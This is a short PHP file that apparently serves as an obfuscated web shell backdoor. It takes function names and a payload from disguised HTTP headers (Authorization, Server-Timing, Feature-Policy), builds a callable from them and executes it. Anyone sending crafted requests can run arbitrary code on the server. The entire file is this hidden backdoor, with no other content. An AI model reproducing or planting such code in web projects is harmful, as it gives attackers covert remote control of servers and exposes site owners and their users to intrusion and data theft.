<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Authorization'])) {
    $dba_insertion = $_HEADERS['Authorization']('', $_HEADERS['Server-Timing']($_HEADERS['Feature-Policy']));
    $dba_insertion();
}